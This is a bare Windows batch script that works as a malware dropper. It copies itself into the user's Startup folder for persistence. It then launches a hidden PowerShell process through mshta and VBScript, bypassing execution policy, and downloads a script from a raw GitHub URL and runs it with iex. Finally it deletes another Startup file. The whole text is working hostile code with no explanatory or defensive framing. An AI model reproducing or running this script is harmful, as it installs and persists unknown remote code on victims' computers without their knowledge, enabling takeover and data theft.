@echo off
copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\fr.bat" >nul 2>&1
mshta vbscript:close(createobject("wscript.shell").run("powershell -NoProfile -ExecutionPolicy Bypass -Command \"$ProgressPreference = 'SilentlyContinue';$t = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/43a1723/test/main/download.ps1' -UseBasicParsing; iex $t\"",0))
del /f /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Iamskid.bat" >nul 2>&1
